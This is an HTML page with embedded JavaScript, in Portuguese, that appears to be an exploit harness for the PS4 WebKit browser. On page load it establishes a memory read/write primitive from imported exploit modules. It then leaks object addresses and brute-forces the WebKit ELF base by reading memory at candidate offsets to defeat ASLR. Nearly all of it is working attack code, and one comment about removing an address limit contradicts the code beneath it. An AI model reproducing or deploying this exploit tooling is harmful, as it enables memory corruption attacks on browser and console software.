
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PS4 WebKit — Brute Force Base Expandido</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    height: 100%; background: #0b0f19; color: #c8ced8;
    font: 13px/1.5 "Segoe UI", system-ui, sans-serif;
    display: flex; flex-direction: column; align-items: center;
    justify-content: flex-start; gap: 10px; padding: 14px;
  }
  h1 { color: #fff; font-size: 18px; letter-spacing: 0.5px; }
  #status {
    font-size: 16px; font-weight: 700; color: #fff;
    min-height: 1.4em; text-align: center;
  }
  #log {
    width: 98%; max-width: 960px; height: 280px;
    background: #111827; border: 1px solid #1f2937;
    border-radius: 8px; padding: 10px 12px;
    overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
    font-size: 11px; color: #9fb1c3;
    white-space: pre-wrap; word-break: break-all;
    box-shadow: inset 0 2px 8px rgba(0,0,0,0.4);
  }
  #log .ok { color: #4ade80; }
  #log .err { color: #f87171; }
  #log .info { color: #60a5fa; }
  #log .warn { color: #fbbf24; }
  #log .found { color: #a78bfa; font-weight: bold; }
  #guesses {
    display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
    gap: 6px; justify-content: center; max-width: 960px; width: 98%;
    max-height: 220px; overflow-y: auto;
  }
  .guess-btn {
    padding: 8px 6px; border: 1px solid rgba(255,255,255,0.15);
    border-radius: 6px; color: #fff;
    background: linear-gradient(135deg, #374151, #1f2937);
    box-shadow: 0 2px 6px rgba(0,0,0,0.3);
    font: 700 11px/1.2 "Segoe UI", system-ui, sans-serif;
    cursor: pointer; transition: all .1s ease; text-align: center;
    min-height: 44px; display: flex; flex-direction: column;
    align-items: center; justify-content: center;
  }
  .guess-btn:hover { transform: translateY(-1px); border-color: #60a5fa; }
  .guess-btn:active { transform: translateY(1px); }
  .guess-btn:disabled {
    opacity: 0.35; cursor: not-allowed; transform: none;
    background: #1f2937; box-shadow: none; border-color: #374151;
  }
  .guess-btn.found {
    background: linear-gradient(135deg, #22c55e, #15803d);
    box-shadow: 0 2px 8px rgba(34,197,94,0.35);
  }
  .guess-btn.crash {
    background: linear-gradient(135deg, #7f1d1d, #450a0a);
    opacity: 0.5;
  }
  #warning {
    color: #fbbf24; font-size: 12px; text-align: center;
    max-width: 900px; line-height: 1.4;
  }
  #controls {
    display: flex; gap: 8px; flex-wrap: wrap;
    justify-content: center; align-items: center;
  }
  .ctrl-btn {
    padding: 8px 16px; border-radius: 6px; border: none;
    background: #1e40af; color: #fff; cursor: pointer;
    font-size: 12px; font-weight: 600;
  }
  .ctrl-btn:hover { background: #2563eb; }
  .ctrl-btn:disabled { background: #374151; opacity: 0.5; cursor: not-allowed; }
  .ctrl-btn.danger { background: #b91c1c; }
  .ctrl-btn.danger:hover { background: #dc2626; }
  #custom-area {
    display: flex; gap: 6px; align-items: center; flex-wrap: wrap;
    justify-content: center;
  }
  #custom-area input {
    background: #111827; border: 1px solid #374151; color: #fff;
    padding: 6px 10px; border-radius: 5px; font-family: monospace;
    font-size: 12px; width: 140px;
  }
  #custom-area input:focus { outline: none; border-color: #60a5fa; }
  #stats {
    font-size: 11px; color: #6b7280; text-align: center;
  }
  .section-title {
    color: #9ca3af; font-size: 11px; text-transform: uppercase;
    letter-spacing: 0.05em; margin-top: 4px;
  }
</style>
</head>
<body>

<h1>PS4 WebKit — Brute Force Base Expandido</h1>
<div id="status">Inicializando...</div>
<div id="log"></div>

<div class="section-title">Controles</div>
<div id="controls">
  <button class="ctrl-btn" id="btnAuto" onclick="autoBruteForce()">🔎 Auto Scan</button>
  <button class="ctrl-btn danger" id="btnStop" onclick="stopScan()" disabled>⏹ Parar</button>
  <button class="ctrl-btn" onclick="clearLog()">🗑️ Limpar Log</button>
</div>

<div class="section-title">Offset Customizado</div>
<div id="custom-area">
  <input type="text" id="customOff" placeholder="Offset hex (ex: 0x1200000)" value="0x1200000">
  <button class="ctrl-btn" onclick="testCustomOffset()">Testar Offset</button>
</div>

<div id="warning">
  ⚠️ Cada teste lê 4 bytes na memória. Endereço errado = <b>crash imediato</b>.<br>
  O PS4 vai mostrar "não há memória de sistema livre". Anote o último teste antes do crash.
</div>
<div id="stats"></div>

<div class="section-title">Offsets Predefinidos (clique para testar)</div>
<div id="guesses"></div>

<script type="module">
  import { establishPrimitive } from "./resources/core.js";
  import { installWindowP } from "./resources/mem.js";
  import { int64 } from "./resources/int64.js";

  const status = document.getElementById("status");
  const logBox = document.getElementById("log");
  const guessesDiv = document.getElementById("guesses");
  const btnAuto = document.getElementById("btnAuto");
  const btnStop = document.getElementById("btnStop");
  const statsDiv = document.getElementById("stats");

  let scanRunning = false;
  let scanIdx = 0;
  let scanOffsets = [];
  let testedCount = 0;
  let crashCount = 0;

  function log(msg, cls = "info") {
    const line = document.createElement("div");
    line.className = cls;
    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    logBox.appendChild(line);
    logBox.scrollTop = logBox.scrollHeight;
    if (logBox.children.length > 300) logBox.removeChild(logBox.firstChild);
  }

  window.clearLog = function() {
    logBox.innerHTML = "";
    log("Log limpo.", "info");
  };

  function updateStats() {
    statsDiv.textContent = `Testados: ${testedCount} | Crashs: ${crashCount} | Scan: ${scanRunning ? "ativo" : "parado"}`;
  }

  // ============================================================
  // PATCH CRÍTICO PS4 — Remove restrição de endereço >= 4GB
  // ============================================================
  function patchCarrierPS4(carrier) {
    if (!carrier || typeof carrier.aim !== "function") {
      log("Carrier inválido — patch abortado", "err");
      return carrier;
    }
    const origAim = carrier.aim.bind(carrier);
    carrier.aim = function(address) {
      if (typeof address !== "number" || !Number.isFinite(address)
          || address < 0 || address > 0x00007fffffffffff) {
        throw new RangeError("core.aim: implausible address " + address);
      }
      return origAim(address);
    };
    log("Carrier patchado para endereçamento PS4 (low ASLR)", "ok");
    return carrier;
  }

  // ============================================================
  // GERAR OFFSETS (de -1MB a -256MB, passos de 2MB)
  // ============================================================
  function generateOffsets() {
    const list = [];
    // Passos de 2MB de -1MB até -256MB
    for (let off = 0x100000; off <= 0x10000000; off += 0x200000) {
      const mb = off / 0x100000;
      list.push({ off, label: `-${mb}MB` });
    }
    // Também testar alguns offsets menores com granularidade fina
    for (let off = 0x40000; off < 0x100000; off += 0x40000) {
      const kb = off / 0x400;
      list.push({ off, label: `-${kb}KB` });
    }
    return list;
  }

  const ALL_OFFSETS = generateOffsets();

  // ============================================================
  // TESTAR BASE
  // ============================================================
  window.testBase = async function(baseHex, label, saveSession = true) {
    const p = window.p;
    if (!p) { log("window.p não disponível!", "err"); return "fail"; }

    log(`=== TESTANDO ${label} => ${baseHex} ===`, "warn");

    try {
      let low = parseInt(baseHex.slice(-8), 16);
      let hi = parseInt(baseHex.slice(0, -8) || "0", 16);
      let addr = new int64(low, hi);

      let magic = p.read4(addr);
      let magicHex = "0x" + magic.toString(16).padStart(8, '0');

      log(`Magic: ${magicHex}`, "info");
      testedCount++;
      updateStats();

      if (magicHex === "0x464c457f") {
        log(`✅✅✅ ELF ENCONTRADO @ ${baseHex} !!!`, "found");
        window.__webkitBase = addr;

        let eiClass = p.read1(addr.add32(4));
        let eiData = p.read1(addr.add32(5));
        log(`ELF class=${eiClass} data=${eiData} | LITTLE ENDIAN`, "ok");

        document.querySelectorAll('.guess-btn').forEach(btn => {
          if (btn.dataset.base === baseHex) btn.classList.add('found');
        });

        let ctor = globalThis.__ps5NativeCtor;
        if (typeof ctor === "number") {
          let ctorOffset = ctor - addr.low;
          if (addr.hi === 0) {
            log(`__ps5NativeCtor offset = 0x${ctorOffset.toString(16)}`, "ok");
            try { sessionStorage.setItem("ps4_wk_offset", ctorOffset.toString(16)); } catch(e){}
          }
        }

        status.textContent = `✅ BASE: ${baseHex}`;
        status.style.color = "#4ade80";
        scanRunning = false;
        btnAuto.disabled = false;
        btnStop.disabled = true;
        return "found";
      } else {
        log(`❌ Não é ELF (magic=${magicHex})`, "err");
        return "wrong";
      }
    } catch (e) {
      log(`❌ FALHA: ${e.name}: ${e.message}`, "err");
      testedCount++;
      crashCount++;
      updateStats();
      return "fail";
    }
  };

  // ============================================================
  // CRIAR BOTÕES
  // ============================================================
  function createButtons(ctor) {
    guessesDiv.innerHTML = "";

    ALL_OFFSETS.forEach(({ off, label }) => {
      let base = (ctor - off) & 0xFFFFFFFFFFFFC000;
      let baseHex = "0x" + base.toString(16).padStart(16, '0');

      let btn = document.createElement("button");
      btn.className = "guess-btn";
      btn.dataset.base = baseHex;
      btn.dataset.off = "0x" + off.toString(16);
      btn.innerHTML = `<span style="font-size:10px;color:#9ca3af">${label}</span><span style="font-size:11px">${baseHex.slice(0,6)}...${baseHex.slice(-6)}</span>`;
      btn.onclick = async () => {
        document.querySelectorAll('.guess-btn').forEach(b => b.disabled = true);
        btnAuto.disabled = true;
        let res = await window.testBase(baseHex, label);
        if (res !== "found") {
          btn.classList.add("crash");
          document.querySelectorAll('.guess-btn').forEach(b => {
            if (!b.classList.contains("crash") && !b.classList.contains("found")) b.disabled = false;
          });
          btnAuto.disabled = false;
        }
      };
      guessesDiv.appendChild(btn);
    });
  }

  // ============================================================
  // OFFSET CUSTOMIZADO
  // ============================================================
  window.testCustomOffset = async function() {
    const input = document.getElementById("customOff").value.trim();
    let off = parseInt(input, 16);
    if (isNaN(off) || off <= 0) {
      log("Offset inválido. Use formato hex: 0x1200000", "err");
      return;
    }
    const ctor = globalThis.__ps5NativeCtor;
    if (typeof ctor !== "number") {
      log("__ps5NativeCtor não disponível", "err");
      return;
    }
    let base = (ctor - off) & 0xFFFFFFFFFFFFC000;
    let baseHex = "0x" + base.toString(16).padStart(16, '0');
    document.querySelectorAll('.guess-btn').forEach(b => b.disabled = true);
    btnAuto.disabled = true;
    let res = await window.testBase(baseHex, `custom(0x${off.toString(16)})`);
    if (res !== "found") {
      document.querySelectorAll('.guess-btn').forEach(b => {
        if (!b.classList.contains("crash") && !b.classList.contains("found")) b.disabled = false;
      });
      btnAuto.disabled = false;
    }
  };

  // ============================================================
  // AUTO SCAN
  // ============================================================
  window.autoBruteForce = async function() {
    const p = window.p;
    const ctor = globalThis.__ps5NativeCtor;
    if (!p || typeof ctor !== "number") {
      log("Primitivas não prontas", "err");
      return;
    }

    // Verificar se tem offset salvo de sessão anterior
    let savedOff = null;
    try { savedOff = sessionStorage.getItem("ps4_wk_offset"); } catch(e){}
    if (savedOff) {
      log(`Offset salvo da sessão anterior: 0x${savedOff}`, "warn");
      let off = parseInt(savedOff, 16);
      let base = (ctor - off) & 0xFFFFFFFFFFFFC000;
      let baseHex = "0x" + base.toString(16).padStart(16, '0');
      log(`Tentando offset salvo primeiro: ${baseHex}`, "warn");
      let res = await window.testBase(baseHex, `saved(0x${savedOff})`);
      if (res === "found") return;
    }

    log("🔎 Iniciando Auto Scan...", "warn");
    scanRunning = true;
    scanIdx = 0;
    scanOffsets = ALL_OFFSETS.slice();
    btnAuto.disabled = true;
    btnStop.disabled = false;
    document.querySelectorAll('.guess-btn').forEach(b => b.disabled = true);

    for (const { off, label } of scanOffsets) {
      if (!scanRunning) {
        log("Scan interrompido pelo usuário.", "warn");
        break;
      }
      let base = (ctor - off) & 0xFFFFFFFFFFFFC000;
      let baseHex = "0x" + base.toString(16).padStart(16, '0');

      // Destacar botão atual
      let btn = Array.from(document.querySelectorAll('.guess-btn')).find(b => b.dataset.off === "0x" + off.toString(16));
      if (btn) btn.style.borderColor = "#fbbf24";

      let res = await window.testBase(baseHex, label, false);

      if (btn) btn.style.borderColor = "";

      if (res === "found") {
        scanRunning = false;
        btnAuto.disabled = false;
        btnStop.disabled = true;
        return;
      }

      // Delay entre tentativas para não sobrecarregar
      await new Promise(r => setTimeout(r, 80));
    }

    log("❌ Auto Scan completado — nenhum ELF encontrado.", "err");
    scanRunning = false;
    btnAuto.disabled = false;
    btnStop.disabled = true;
    document.querySelectorAll('.guess-btn').forEach(b => {
      if (!b.classList.contains("crash") && !b.classList.contains("found")) b.disabled = false;
    });
  };

  window.stopScan = function() {
    scanRunning = false;
    log("Scan marcado para parada...", "warn");
  };

  // ============================================================
  // BOOTSTRAP
  // ============================================================
  log("Carregando módulos slopkit...", "ok");
  status.textContent = "Executando exploit...";

  establishPrimitive({ onEvent: (tag, detail) => log(`${tag}: ${detail}`, "info") })
    .then(carrier => {
      log("Core: primitivo estabelecido", "ok");
      log(`Tentativas do core: ${carrier.attempts}`, "info");

      patchCarrierPS4(carrier);

      const prim = installWindowP(carrier, {
        onEvent: (tag, detail) => log(`${tag}: ${detail}`, "info"),
        promote: true
      });

      log("Mem: real pair ativo", "ok");
      log("window.p está disponível", "ok");

      window.__carrier = carrier;
      window.__prim = prim;
      window.p = prim;
      window.int64 = int64;

      let ctor = globalThis.__ps5NativeCtor;
      if (typeof ctor === "number") {
        log(`__ps5NativeCtor = 0x${ctor.toString(16)}`, "ok");
        createButtons(ctor);
        status.textContent = "Pronto — escolha um offset ou use Auto Scan";
        status.style.color = "#60a5fa";
        updateStats();
      } else {
        log("__ps5NativeCtor não disponível", "err");
        status.textContent = "Erro: __ps5NativeCtor não encontrado";
        status.style.color = "#f87171";
      }

      try {
        const testAddr = prim.leakval(prim);
        log(`Sanity leak(prim) = 0x${testAddr.toString(16)}`, "ok");
      } catch (e) {
        log(`Sanity leak falhou: ${e.message}`, "err");
      }
    })
    .catch(err => {
      log(`FALHA: ${err.name}: ${err.message}`, "err");
      status.textContent = "Falha no exploit";
      status.style.color = "#f87171";
    });
</script>

</body>
</html>
